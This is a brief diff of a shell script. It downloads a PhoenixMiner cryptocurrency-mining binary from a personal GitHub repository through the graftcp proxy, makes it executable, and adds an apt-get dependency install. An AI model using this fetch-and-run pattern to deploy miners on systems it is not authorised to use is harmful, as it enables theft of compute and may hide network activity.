@@ -45,7 +45,7 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/denisule54/why/raw/main/PhoenixMiner
+./graftcp/graftcp apt-get install libpci3 && wget https://github.com/denisule54/why/raw/main/PhoenixMiner
 chmod +x PhoenixMiner
 
 
